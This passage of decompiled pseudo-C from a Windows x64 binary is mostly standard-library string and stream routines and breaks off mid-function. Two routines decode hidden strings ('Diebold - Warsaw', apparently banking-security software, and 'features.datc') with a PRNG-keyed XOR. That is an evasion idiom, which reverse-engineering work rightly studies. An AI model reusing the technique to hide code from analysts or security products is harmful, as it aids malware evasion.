// 1400D9B4E: using guessed type char byte_1400D9B4E;
// 1400D9B4F: using guessed type char byte_1400D9B4F;
// 1400D9B50: using guessed type char byte_1400D9B50;
// 1400D9B51: using guessed type char byte_1400D9B51;
// 1400D9B52: using guessed type char byte_1400D9B52;
// 1400D9B53: using guessed type char byte_1400D9B53;
// 1400D9B54: using guessed type char byte_1400D9B54;

//----- (000000014000B690) ----------------------------------------------------
_QWORD *__fastcall sub_14000B690(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9B58;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9B58 & 1 )
  {
    v5 = byte_1400D9B55;
  }
  else
  {
    v4 = 69069 * dword_1400D9B14 + 1234567;
    v1 = dword_1400D9B58 | 1;
    dword_1400D9B14 = v4;
    dword_1400D9B58 |= 1u;
    dword_1400D9B0C = HIWORD(dword_1400D9B0C) + 36969 * (unsigned __int16)dword_1400D9B0C;
    LOBYTE(v4) = (BYTE2(dword_1400D9B18) + 80 * dword_1400D9B18) ^ v4;
    dword_1400D9B18 = HIWORD(dword_1400D9B18) + 18000 * (unsigned __int16)dword_1400D9B18;
    v5 = (((unsigned int)dword_1400D9B10 >> 13) ^ 32 * dword_1400D9B10 ^ dword_1400D9B10) + v4;
    dword_1400D9B10 ^= ((unsigned int)dword_1400D9B10 >> 13) ^ 32 * (dword_1400D9B10 ^ (dword_1400D9B10 << 12));
    byte_1400D9B55 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9B58 = v1 | 2;
    byte_1400D9B60[0] = v5 ^ 0x44;
    byte_1400D9B61 = (v5 - 1) ^ 0x69;
    byte_1400D9B62 = (v5 - 2) ^ 0x65;
    byte_1400D9B63 = (v5 - 3) ^ 0x62;
    byte_1400D9B64 = (v5 - 4) ^ 0x6F;
    byte_1400D9B65 = (v5 - 5) ^ 0x6C;
    byte_1400D9B66 = (v5 - 6) ^ 0x64;
    byte_1400D9B67 = (v5 - 7) ^ 0x20;
    byte_1400D9B68 = (v5 - 8) ^ 0x2D;
    byte_1400D9B69 = (v5 - 9) ^ 0x20;
    byte_1400D9B6A = (v5 - 10) ^ 0x57;
    byte_1400D9B6B = (v5 - 11) ^ 0x61;
    byte_1400D9B6C = (v5 - 12) ^ 0x72;
    byte_1400D9B6D = (v5 - 13) ^ 0x73;
    byte_1400D9B6E = (v5 - 14) ^ 0x61;
    byte_1400D9B6F = (v5 - 15) ^ 0x77;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x10ui64 && (sub_140004790(Src, 0x10ui64, 0i64), v5 = byte_1400D9B55, v3[3] < 0x10ui64) )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 16i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 16) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9B60[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x10 );
  return v3;
}
// 1400D9B0C: using guessed type int dword_1400D9B0C;
// 1400D9B10: using guessed type int dword_1400D9B10;
// 1400D9B14: using guessed type int dword_1400D9B14;
// 1400D9B18: using guessed type int dword_1400D9B18;
// 1400D9B55: using guessed type char byte_1400D9B55;
// 1400D9B58: using guessed type int dword_1400D9B58;
// 1400D9B61: using guessed type char byte_1400D9B61;
// 1400D9B62: using guessed type char byte_1400D9B62;
// 1400D9B63: using guessed type char byte_1400D9B63;
// 1400D9B64: using guessed type char byte_1400D9B64;
// 1400D9B65: using guessed type char byte_1400D9B65;
// 1400D9B66: using guessed type char byte_1400D9B66;
// 1400D9B67: using guessed type char byte_1400D9B67;
// 1400D9B68: using guessed type char byte_1400D9B68;
// 1400D9B69: using guessed type char byte_1400D9B69;
// 1400D9B6A: using guessed type char byte_1400D9B6A;
// 1400D9B6B: using guessed type char byte_1400D9B6B;
// 1400D9B6C: using guessed type char byte_1400D9B6C;
// 1400D9B6D: using guessed type char byte_1400D9B6D;
// 1400D9B6E: using guessed type char byte_1400D9B6E;
// 1400D9B6F: using guessed type char byte_1400D9B6F;

//----- (000000014000B9E0) ----------------------------------------------------
signed __int64 __fastcall sub_14000B9E0(_QWORD *a1, _QWORD *a2)
{
  size_t v2; // rdi
  size_t v3; // rbx
  size_t v4; // r8
  unsigned int v5; // esi
  signed __int64 result; // rax

  v2 = a2[2];
  if ( a2[3] >= 0x10ui64 )
    a2 = (_QWORD *)*a2;
  v3 = a1[2];
  if ( a1[3] >= 0x10ui64 )
    a1 = (_QWORD *)*a1;
  v4 = v2;
  if ( v3 < v2 )
    v4 = v3;
  v5 = 0;
  if ( v4 )
    LODWORD(result) = memcmp(a1, a2, v4);
  else
    LODWORD(result) = 0;
  result = (signed int)result;
  if ( !(_DWORD)result )
  {
    if ( v3 >= v2 )
    {
      LOBYTE(v5) = v3 != v2;
      result = v5;
    }
    else
    {
      result = 0xFFFFFFFFi64;
    }
  }
  return result;
}

//----- (000000014000BA60) ----------------------------------------------------
__int64 __fastcall sub_14000BA60(__int64 *a1)
{
  __int64 *v1; // rsi
  __int64 v2; // rcx
  unsigned __int64 v3; // rdi
  __int64 v4; // rax
  __int64 v5; // rbx
  __int64 v6; // rax
  char v8; // [rsp+28h] [rbp-20h]
  char v9; // [rsp+50h] [rbp+8h]
  __int64 v10; // [rsp+58h] [rbp+10h]

  v1 = a1;
  std::_Lockit::_Lockit((std::_Lockit *)&v9, 0);
  v10 = qword_1400D9BA8;
  v3 = std::locale::id::operator unsigned __int64(std::codecvt<char,char,int>::id);
  v4 = *v1;
  if ( v3 >= *(_QWORD *)(*v1 + 24) )
  {
    v5 = 0i64;
  }
  else
  {
    v2 = *(_QWORD *)(v4 + 16);
    v5 = *(_QWORD *)(v2 + 8 * v3);
    if ( v5 )
      goto LABEL_14;
  }
  if ( !*(_BYTE *)(v4 + 36) )
    goto LABEL_8;
  v6 = std::locale::_Getgloballocale(v2);
  if ( v3 < *(_QWORD *)(v6 + 24) )
  {
    v5 = *(_QWORD *)(*(_QWORD *)(v6 + 16) + 8 * v3);
LABEL_8:
    if ( v5 )
      goto LABEL_14;
  }
  v5 = v10;
  if ( !v10 )
  {
    if ( std::codecvt<char,char,int>::_Getcat(&v10, v1) == -1 )
    {
      std::bad_cast::bad_cast((std::bad_cast *)&v8, "bad cast");
      CxxThrowException(&v8, &_TI2_AVbad_cast_std__);
    }
    v5 = v10;
    qword_1400D9BA8 = v10;
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v10 + 8i64))(v10);
    unknown_libname_8(v5);
  }
LABEL_14:
  std::_Lockit::~_Lockit((std::_Lockit *)&v9);
  return v5;
}
// 140086120: using guessed type __int64 __fastcall unknown_libname_8(_QWORD);
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A16C8: using guessed type __int64 __fastcall std::codecvt<char,char,int>::_Getcat(_QWORD, _QWORD);
// 1400A16F0: using guessed type __int64 __cdecl std::locale::_Getgloballocale(_QWORD);
// 1400A16F8: using guessed type __int64 __fastcall std::locale::id::operator unsigned __int64(_QWORD);
// 1400A1700: using guessed type _QWORD std::_Lockit::~_Lockit(std::_Lockit *__hidden this);
// 1400A1708: using guessed type _QWORD std::_Lockit::_Lockit(std::_Lockit *__hidden this, _DWORD);
// 1400A1A18: using guessed type _QWORD std::bad_cast::bad_cast(std::bad_cast *__hidden this, const char *);
// 1400D3168: using guessed type int _TI2_AVbad_cast_std__;
// 1400D9BA8: using guessed type __int64 qword_1400D9BA8;

//----- (000000014000BB70) ----------------------------------------------------
_QWORD *__fastcall sub_14000BB70(_QWORD *a1, const char *a2, int a3, int a4, int a5)
{
  int v5; // ebp
  int v6; // esi
  const char *v7; // r14
  _QWORD *v8; // rdi
  __int64 v9; // rbx

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  if ( a5 )
  {
    *a1 = &unk_1400A3188;
    a1[22] = std::ios_base::`vftable';
    a1[22] = std::basic_ios<char,std::char_traits<char>>::`vftable';
  }
  v9 = (__int64)(a1 + 2);
  std::basic_istream<char,std::char_traits<char>>::basic_istream<char,std::char_traits<char>>(
    a1,
    a1 + 2,
    0i64,
    0i64,
    -2i64);
  *(_QWORD *)((char *)v8 + *(signed int *)(*v8 + 4i64)) = &off_1400A3180;
  *(_DWORD *)((char *)v8 + *(signed int *)(*v8 + 4i64) - 4) = *(_DWORD *)(*v8 + 4i64) - 176;
  std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(v9);
  *(_QWORD *)v9 = &off_1400A3108;
  *(_BYTE *)(v9 + 136) = 0;
  *(_BYTE *)(v9 + 129) = 0;
  std::basic_streambuf<char,std::char_traits<char>>::_Init(v9);
  *(_QWORD *)(v9 + 144) = 0i64;
  *(_DWORD *)(v9 + 132) = dword_1400D9BA0;
  *(_QWORD *)(v9 + 120) = 0i64;
  if ( !sub_14000CFB0(v9, v7, v6 | 1u, v5) )
    std::basic_ios<char,std::char_traits<char>>::setstate((char *)v8 + *(signed int *)(*v8 + 4i64), 2i64);
  return v8;
}
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A1680: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::basic_istream<char,std::char_traits<char>>(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1400A1688: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::setstate(_QWORD, _QWORD);
// 1400A1698: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::_Init(_QWORD);
// 1400A16B8: using guessed type __int64 __cdecl std::basic_streambuf<char,std::char_traits<char>>::basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A3108: using guessed type __int64 (__fastcall *off_1400A3108)(void *);
// 1400A3180: using guessed type __int64 (__fastcall *off_1400A3180)();
// 1400D9BA0: using guessed type int dword_1400D9BA0;

//----- (000000014000BCC0) ----------------------------------------------------
__int64 __fastcall sub_14000BCC0(_QWORD *a1)
{
  bool v1; // zf
  __int64 v2; // rbx
  _QWORD *v3; // rcx
  __int64 v4; // rdx
  __int64 v5; // r8

  v1 = a1[18] == 0i64;
  v2 = (__int64)a1;
  *a1 = &off_1400A3108;
  if ( !v1 )
  {
    v3 = (_QWORD *)a1[3];
    if ( *v3 == v2 + 128 )
    {
      v4 = *(_QWORD *)(v2 + 104);
      v5 = *(_QWORD *)(v2 + 112);
      *v3 = v4;
      **(_QWORD **)(v2 + 56) = v4;
      **(_DWORD **)(v2 + 80) = v5 - v4;
    }
  }
  if ( *(_BYTE *)(v2 + 136) )
    sub_14000C9E0(v2);
  return std::basic_streambuf<char,std::char_traits<char>>::~basic_streambuf<char,std::char_traits<char>>(v2);
}
// 1400A16B0: using guessed type __int64 __fastcall std::basic_streambuf<char,std::char_traits<char>>::~basic_streambuf<char,std::char_traits<char>>(_QWORD);
// 1400A3108: using guessed type __int64 (__fastcall *off_1400A3108)(void *);

//----- (000000014000BD30) ----------------------------------------------------
__int64 __fastcall sub_14000BD30(__int64 *a1)
{
  __int64 v1; // rbx
  __int64 *v2; // rdi
  __int64 i; // rsi
  __int64 result; // rax

  v1 = *a1;
  v2 = a1;
  if ( *a1 )
  {
    for ( i = a1[1]; v1 != i; v1 += 120i64 )
      sub_14000BD90(v1);
    operator delete((void *)*v2);
    result = 0i64;
    *v2 = 0i64;
    v2[1] = 0i64;
    v2[2] = 0i64;
  }
  return result;
}

//----- (000000014000BD90) ----------------------------------------------------
void __fastcall sub_14000BD90(__int64 a1)
{
  __int64 v1; // rdi
  char v2; // [rsp+30h] [rbp+8h]

  v1 = a1;
  sub_14000CA70((__int64 **)(a1 + 96), (__int64 *)&v2, **(_QWORD **)(a1 + 96), *(_QWORD *)(a1 + 96));
  operator delete(*(void **)(v1 + 96));
  if ( *(_QWORD *)(v1 + 88) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 64));
  *(_QWORD *)(v1 + 88) = 15i64;
  *(_QWORD *)(v1 + 80) = 0i64;
  *(_BYTE *)(v1 + 64) = 0;
  if ( *(_QWORD *)(v1 + 56) >= 0x10ui64 )
    operator delete(*(void **)(v1 + 32));
  *(_QWORD *)(v1 + 56) = 15i64;
  *(_QWORD *)(v1 + 48) = 0i64;
  *(_BYTE *)(v1 + 32) = 0;
  if ( *(_QWORD *)(v1 + 24) >= 0x10ui64 )
    operator delete(*(void **)v1);
  *(_QWORD *)(v1 + 16) = 0i64;
  *(_QWORD *)(v1 + 24) = 15i64;
  *(_BYTE *)v1 = 0;
}

//----- (000000014000BE30) ----------------------------------------------------
void __fastcall sub_14000BE30(char **a1)
{
  char **v1; // rdi
  char *v2; // rbx
  char *i; // rsi

  v1 = a1;
  if ( (unsigned __int64)a1[6] >= 0x10 )
    operator delete(a1[3]);
  v1[6] = (char *)15;
  v1[5] = 0i64;
  *((_BYTE *)v1 + 24) = 0;
  v2 = *v1;
  if ( *v1 )
  {
    for ( i = v1[1]; v2 != i; v2 += 120 )
      sub_14000BD90((__int64)v2);
    operator delete(*v1);
    *v1 = 0i64;
    v1[1] = 0i64;
    v1[2] = 0i64;
  }
}

//----- (000000014000BEC0) ----------------------------------------------------
void __fastcall sub_14000BEC0(_QWORD *a1)
{
  struct std::ios_base *v1; // rbx

  v1 = (struct std::ios_base *)(a1 + 22);
  *(_QWORD *)((char *)v1 + *(signed int *)(*a1 + 4i64) - 176) = &off_1400A3180;
  *(_DWORD *)((char *)v1 + *(signed int *)(*a1 + 4i64) - 180) = *(_DWORD *)(*a1 + 4i64) - 176;
  sub_14000BCC0(a1 + 2);
  std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>((char *)v1 - 152);
  *(_QWORD *)v1 = std::basic_ios<char,std::char_traits<char>>::`vftable';
  *(_QWORD *)v1 = std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 1400A1638: using guessed type void *std::basic_ios<char,std::char_traits<char>>::`vftable';
// 1400A1640: using guessed type void *std::ios_base::`vftable';
// 1400A1678: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>(_QWORD);
// 1400A16C0: using guessed type void __stdcall static std::ios_base::_Ios_base_dtor(struct std::ios_base *);
// 1400A3180: using guessed type __int64 (__fastcall *off_1400A3180)();

//----- (000000014000BF3C) ----------------------------------------------------
void *__fastcall sub_14000BF3C(__int64 a1, char a2)
{
  return sub_14000BF80(a1 - *(signed int *)(a1 - 4), a2);
}

//----- (000000014000BF50) ----------------------------------------------------
void *__fastcall sub_14000BF50(void *a1, char a2)
{
  char v2; // bl
  void *v3; // rdi

  v2 = a2;
  v3 = a1;
  sub_14000BCC0(a1);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (000000014000BF80) ----------------------------------------------------
void *__fastcall sub_14000BF80(__int64 a1, char a2)
{
  void *v2; // rdi
  char v3; // bl

  v2 = (void *)(a1 - 176);
  v3 = a2;
  sub_14000BEC0((_QWORD *)(a1 - 176));
  if ( v3 & 1 )
    operator delete(v2);
  return v2;
}

//----- (000000014000BFC0) ----------------------------------------------------
_QWORD *__fastcall sub_14000BFC0(_QWORD *a1)
{
  _QWORD *v1; // rdi
  char *v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rcx
  char *v5; // rbx
  __int64 v6; // rbp
  unsigned __int64 v7; // rax
  char *v8; // rsi
  __int64 v9; // rax
  _QWORD *v10; // rax
  void *v12; // [rsp+30h] [rbp-88h]
  __int64 v13; // [rsp+40h] [rbp-78h]
  unsigned __int64 v14; // [rsp+48h] [rbp-70h]
  void *v15; // [rsp+50h] [rbp-68h]
  __int64 v16; // [rsp+60h] [rbp-58h]
  unsigned __int64 v17; // [rsp+68h] [rbp-50h]
  void *Src; // [rsp+70h] [rbp-48h]
  unsigned __int64 v19; // [rsp+88h] [rbp-30h]

  v1 = a1;
  v2 = (char *)sub_14000C110(&v15);
  v5 = v2;
  v14 = 7i64;
  v13 = 0i64;
  LOWORD(v12) = 0;
  v6 = *((_QWORD *)v2 + 2);
  if ( v6 )
  {
    v7 = *((_QWORD *)v2 + 3);
    if ( v7 < 0x10 )
      v8 = v5;
    else
      v8 = *(char **)v5;
    if ( v7 >= 0x10 )
      v5 = *(char **)v5;
    v9 = sub_140031970(v4, v3);
    sub_140030C60(v5, &v8[v6], &v12, v9);
  }
  v10 = sub_14007A1A0();
  sub_140003DE0(&Src, v10, &v12);
  if ( v14 >= 8 )
    operator delete(v12);
  v14 = 7i64;
  v13 = 0i64;
  LOWORD(v12) = 0;
  if ( v17 >= 0x10 )
    operator delete(v15);
  v17 = 15i64;
  v16 = 0i64;
  LOBYTE(v15) = 0;
  sub_1400054F0(&Src, v1);
  if ( v19 >= 8 )
    operator delete(Src);
  return v1;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);

//----- (000000014000C110) ----------------------------------------------------
_QWORD *__fastcall sub_14000C110(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9B88;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9B88 & 1 )
  {
    v5 = byte_1400D9B84;
  }
  else
  {
    v4 = 69069 * dword_1400D9B7C + 1234567;
    v1 = dword_1400D9B88 | 1;
    dword_1400D9B7C = v4;
    dword_1400D9B88 |= 1u;
    dword_1400D9B74 = HIWORD(dword_1400D9B74) + 36969 * (unsigned __int16)dword_1400D9B74;
    LOBYTE(v4) = (BYTE2(dword_1400D9B80) + 80 * dword_1400D9B80) ^ v4;
    dword_1400D9B80 = HIWORD(dword_1400D9B80) + 18000 * (unsigned __int16)dword_1400D9B80;
    v5 = (((unsigned int)dword_1400D9B78 >> 13) ^ 32 * dword_1400D9B78 ^ dword_1400D9B78) + v4;
    dword_1400D9B78 ^= ((unsigned int)dword_1400D9B78 >> 13) ^ 32 * (dword_1400D9B78 ^ (dword_1400D9B78 << 12));
    byte_1400D9B84 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9B88 = v1 | 2;
    byte_1400D9B90[0] = v5 ^ 0x66;
    byte_1400D9B91 = (v5 - 1) ^ 0x65;
    byte_1400D9B92 = (v5 - 2) ^ 0x61;
    byte_1400D9B93 = (v5 - 3) ^ 0x74;
    byte_1400D9B94 = (v5 - 4) ^ 0x75;
    byte_1400D9B95 = (v5 - 5) ^ 0x72;
    byte_1400D9B96 = (v5 - 6) ^ 0x65;
    byte_1400D9B97 = (v5 - 7) ^ 0x73;
    byte_1400D9B98 = (v5 - 8) ^ 0x2E;
    byte_1400D9B99 = (v5 - 9) ^ 0x64;
    byte_1400D9B9A = (v5 - 10) ^ 0x61;
    byte_1400D9B9B = (v5 - 11) ^ 0x74;
    byte_1400D9B9C = (v5 - 12) ^ 0x63;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xDui64 )
  {
    sub_140004790(Src, 0xDui64, 0i64);
    v5 = byte_1400D9B84;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_BYTE *)v6 + 12) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 13i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 13) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9B90[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xD );
  return v3;
}
// 1400D9B74: using guessed type int dword_1400D9B74;
// 1400D9B78: using guessed type int dword_1400D9B78;
// 1400D9B7C: using guessed type int dword_1400D9B7C;
// 1400D9B80: using guessed type int dword_1400D9B80;
// 1400D9B84: using guessed type char byte_1400D9B84;
// 1400D9B88: using guessed type int dword_1400D9B88;
// 1400D9B91: using guessed type char byte_1400D9B91;
// 1400D9B92: using guessed type char byte_1400D9B92;
// 1400D9B93: using guessed type char byte_1400D9B93;
// 1400D9B94: using guessed type char byte_1400D9B94;
// 1400D9B95: using guessed type char byte_1400D9B95;
// 1400D9B96: using guessed type char byte_1400D9B96;
// 1400D9B97: using guessed type char byte_1400D9B97;
// 1400D9B98: using guessed type char byte_1400D9B98;
// 1400D9B99: using guessed type char byte_1400D9B99;
// 1400D9B9A: using guessed type char byte_1400D9B9A;
// 1400D9B9B: using guessed type char byte_1400D9B9B;
// 1400D9B9C: using guessed type char byte_1400D9B9C;

//----- (000000014000C320) ----------------------------------------------------
__int64 __fastcall sub_14000C320(const char *a1, bool *a2, bool *a3)
{
  bool *v3; // rdi
  bool *v4; // rbx
  _QWORD *v5; // rax
  _DWORD *v6; // rax
  char *v7; // rbx
  char *v8; // rdi
  int v10; // [rsp+3Ch] [rbp-C4h]
  __int64 v11; // [rsp+40h] [rbp-C0h]
  char v12; // [rsp+50h] [rbp-B0h]
  char v13; // [rsp+58h] [rbp-A8h]
  char v14; // [rsp+F0h] [rbp-10h]
  void *v15[2]; // [rsp+150h] [rbp+50h]
  __int64 v16; // [rsp+160h] [rbp+60h]
  void *v17; // [rsp+168h] [rbp+68h]
  __int64 v18; // [rsp+178h] [rbp+78h]
  unsigned __int64 v19; // [rsp+180h] [rbp+80h]
  void *Src; // [rsp+190h] [rbp+90h]
  unsigned __int64 v21; // [rsp+1A8h] [rbp+A8h]

  v3 = a3;
  v4 = a2;
  if ( *((_QWORD *)a1 + 3) >= 0x10ui64 )
    a1 = *(const char **)a1;
  sub_14000BB70(&v11, a1, 32, 64, 1);
  sub_140081D40(v15, &v11);
  if ( !sub_14000C9E0((__int64)&v12) )
    std::basic_ios<char,std::char_traits<char>>::setstate((char *)&v11 + *(signed int *)(v11 + 4), 2i64);
  v5 = sub_140009FC0(&Src);
  *v4 = (unsigned int)sub_140081E80((__int64 *)v15, (__int64)v5) != 0;
  if ( v21 >= 0x10 )
    operator delete(Src);
  v6 = sub_1400043C0(&Src);
  *v3 = (unsigned int)sub_140081E80((__int64 *)v15, (__int64)v6) != 0;
  if ( v21 >= 0x10 )
    operator delete(Src);
  if ( v19 >= 0x10 )
    operator delete(v17);
  v19 = 15i64;
  v18 = 0i64;
  LOBYTE(v17) = 0;
  v7 = (char *)v15[0];
  if ( v15[0] )
  {
    v8 = (char *)v15[1];
    if ( v15[0] != v15[1] )
    {
      do
      {
        sub_14000BD90((__int64)v7);
        v7 += 120;
      }
      while ( v7 != v8 );
      v7 = (char *)v15[0];
    }
    operator delete(v7);
    _mm_store_si128((__m128i *)v15, (__m128i)0i64);
    v16 = 0i64;
  }
  *(__int64 *)((char *)&v11 + *(signed int *)(v11 + 4)) = (__int64)&off_1400A3180;
  *(int *)((char *)&v10 + *(signed int *)(v11 + 4)) = *(_DWORD *)(v11 + 4) - 176;
  sub_14000BCC0(&v12);
  std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>(&v13);
  return std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(&v14);
}
// 140081D40: using guessed type __int64 __fastcall sub_140081D40(_QWORD, _QWORD);
// 1400A1678: using guessed type __int64 __fastcall std::basic_istream<char,std::char_traits<char>>::~basic_istream<char,std::char_traits<char>>(_QWORD);
// 1400A1688: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::setstate(_QWORD, _QWORD);
// 1400A1690: using guessed type __int64 __fastcall std::basic_ios<char,std::char_traits<char>>::~basic_ios<char,std::char_traits<char>>(_QWORD);
// 1400A3180: using guessed type __int64 (__fastcall *off_1400A3180)();

//----- (000000014000C4F0) ----------------------------------------------------
char __fastcall sub_14000C4F0(__int64 a1)
{
  __int64 v1; // rdi
  unsigned __int64 v3; // rdx
  char *v4; // rcx
  void *v5; // r8
  int v6; // eax
  int v7; // eax
  _BYTE *v8; // rax
  __int64 v9; // rbx
  const void *v10; // rcx
  size_t v11; // rax
  unsigned __int64 v12; // rbx
  _BYTE *v13; // rax
  char *v14; // rcx
  _BYTE *v15; // rax
  char v16; // bl
  _BYTE *v17; // [rsp+30h] [rbp-40h]
  __int64 v18; // [rsp+38h] [rbp-38h]
  void *Str; // [rsp+40h] [rbp-30h]
  char v20; // [rsp+48h] [rbp-28h]
  size_t v21; // [rsp+50h] [rbp-20h]
  unsigned __int64 v22; // [rsp+58h] [rbp-18h]

  v18 = -2i64;
  v1 = a1;
  if ( !*(_QWORD *)(a1 + 120) || !*(_BYTE *)(a1 + 129) )
    return 1;
  if ( (*(unsigned int (__fastcall **)(__int64, signed __int64))(*(_QWORD *)a1 + 24i64))(a1, 0xFFFFFFFFi64) == -1 )
    return 0;
  v22 = 15i64;
  Str = 0i64;
  v21 = 8i64;
  v20 = 0;
LABEL_6:
  v3 = v22;
  while ( 1 )
  {
    v4 = (char *)&Str;
    if ( v3 >= 0x10 )
      v4 = (char *)Str;
    v5 = &Str;
    if ( v3 >= 0x10 )
      v5 = Str;
    v6 = std::codecvt<char,char,int>::unshift(*(_QWORD *)(v1 + 120), v1 + 132, v5, &v4[v21], &v17);
    if ( v6 )
      break;
    *(_BYTE *)(v1 + 129) = 0;
LABEL_15:
    v8 = &Str;
    v3 = v22;
    if ( v22 >= 0x10 )
      v8 = Str;
    v9 = v17 - v8;
    if ( v17 != v8 )
    {
      v10 = &Str;
      if ( v22 >= 0x10 )
        v10 = Str;
      v11 = fwrite(v10, 1ui64, v17 - v8, *(FILE **)(v1 + 144));
      v3 = v22;
      if ( v9 != v11 )
        goto LABEL_38;
    }
    if ( !*(_BYTE *)(v1 + 129) )
      goto LABEL_41;
    if ( !v9 )
    {
      if ( -1i64 - v21 <= 8 )
        goto LABEL_40;
      v12 = v21 + 8;
      if ( v21 + 8 > 0xFFFFFFFFFFFFFFFEui64 )
      {
        std::_Xlength_error("string too long");
        __debugbreak();
LABEL_40:
        std::_Xlength_error("string too long");
        __debugbreak();
        goto LABEL_41;
      }
      if ( v3 >= v12 )
      {
        if ( v21 == -8i64 )
        {
          v21 = 0i64;
          v13 = &Str;
          if ( v3 >= 0x10 )
            v13 = Str;
          *v13 = 0;
        }
        else
        {
LABEL_32:
          v14 = (char *)&Str;
          if ( v3 >= 0x10 )
            v14 = (char *)Str;
          *(_QWORD *)&v14[v21] = 0i64;
          v21 = v12;
          v15 = &Str;
          if ( v22 >= 0x10 )
            v15 = Str;
          v15[v12] = 0;
        }
        goto LABEL_6;
      }
      sub_140004790(&Str, v21 + 8, v21);
      v3 = v22;
      if ( v12 )
        goto LABEL_32;
    }
  }
  v7 = v6 - 1;
  if ( !v7 )
    goto LABEL_15;
  v3 = v22;
  if ( v7 != 2 )
  {
LABEL_38:
    v16 = 0;
    goto LABEL_42;
  }
LABEL_41:
  v16 = 1;
LABEL_42:
  if ( v3 >= 0x10 )
    operator delete(Str);
  return v16;
}
// 1400A16D0: using guessed type __int64 __fastcall std::codecvt<char,char,int>::unshift(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);

//----- (000000014000C720) ----------------------------------------------------
void __fastcall sub_14000C720(__int64 a1, __int64 *a2)
{
  __int64 *v2; // rbx
  __int64 v3; // rsi
  __int64 *i; // rdi

  v2 = a2;
  v3 = a1;
  for ( i = a2; !*((_BYTE *)i + 25); v2 = i )
  {
    sub_14000C720(v3, i[2]);
    i = (__int64 *)*i;
    if ( (unsigned __int64)v2[7] >= 0x10 )
      operator delete((void *)v2[4]);
    v2[7] = 15i64;
    v2[6] = 0i64;
    *((_BYTE *)v2 + 32) = 0;
    operator delete(v2);
  }
}

//----- (000000014000C7B0) ----------------------------------------------------
void __fastcall sub_14000C7B0(__int64 a1)
{
  FILE *v1; // rcx

  v1 = *(FILE **)(a1 + 144);
  if ( v1 )
    lock_file(v1);
}

//----- (000000014000C800) ----------------------------------------------------
_QWORD *__fastcall sub_14000C800(__int64 a1, _QWORD *a2)
{
  __int64 v2; // r8
  __int64 v3; // rax
  _QWORD *result; // rax

  v2 = *a2;
  *a2 = *(_QWORD *)(*a2 + 16i64);
  v3 = *(_QWORD *)(v2 + 16);
  if ( !*(_BYTE *)(v3 + 25) )
    *(_QWORD *)(v3 + 8) = a2;
  *(_QWORD *)(v2 + 8) = a2[1];
  result = *(_QWORD **)a1;
  if ( a2 == *(_QWORD **)(*(_QWORD *)a1 + 8i64) )
  {
    result[1] = v2;
    *(_QWORD *)(v2 + 16) = a2;
    a2[1] = v2;
  }
  else
  {
    result = (_QWORD *)a2[1];
    if ( a2 == (_QWORD *)result[2] )
      result[2] = v2;
    else
